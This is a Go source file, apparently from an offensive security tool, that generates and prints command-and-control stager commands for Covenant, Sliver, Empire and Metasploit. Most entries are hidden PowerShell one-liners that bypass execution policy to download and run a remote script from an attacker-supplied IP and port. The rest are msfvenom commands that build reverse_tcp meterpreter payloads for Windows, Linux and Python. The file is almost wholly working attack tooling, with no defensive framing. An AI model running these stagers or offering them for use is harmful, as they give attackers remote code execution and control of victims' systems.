package main

import (
	"fmt"
	"strings"
)

type C2Framework struct {
	Name     string
	Stager   string
	Protocol string
}

func GetC2Integrations(ip string, port int) []C2Framework {
	portStr := fmt.Sprintf("%d", port)
	return []C2Framework{
		{
			Name:     "Covenant (PowerShell stager)",
			Protocol: "HTTP/HTTPS",
			Stager:   fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/covenant.ps1')"`, ip, port),
		},
		{
			Name:     "Sliver (MSL stager)",
			Protocol: "HTTP/HTTPS",
			Stager:   fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://%s:%d/sliver.ps1')"`, ip, port),
		},
		{
			Name:     "Empire (Launcher base64)",
			Protocol: "HTTP/HTTPS",
			Stager:   fmt.Sprintf(`powershell -NoP -NonI -Exec Bypass -Enc <base64-encoded-empire-launcher>`),
		},
		{
			Name:     "Metasploit (web_delivery)",
			Protocol: "HTTP/HTTPS",
			Stager:   fmt.Sprintf(`msfvenom -p python/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw | base64`, ip, portStr),
		},
		{
			Name:     "Metasploit (Powershell stager)",
			Protocol: "HTTP/HTTPS",
			Stager:   fmt.Sprintf(`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f psh | base64`, ip, portStr),
		},
		{
			Name:     "Metasploit (Linux binary)",
			Protocol: "HTTP/HTTPS",
			Stager:   fmt.Sprintf(`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf`, ip, portStr),
		},
	}
}

func PrintC2Integrations(ip string, port int) {
	fmt.Println()
	fmt.Println(headerf(strings.Repeat("=", 60)))
	fmt.Println(headerf("C2 Framework Integration:"))
	fmt.Println(col(strings.Repeat("-", 60), Cyan))
	for _, c := range GetC2Integrations(ip, port) {
		fmt.Printf("  * %s (%s):\n    %s\n\n", Bold+c.Name+Reset, c.Protocol, col(c.Stager, Cyan))
	}
}
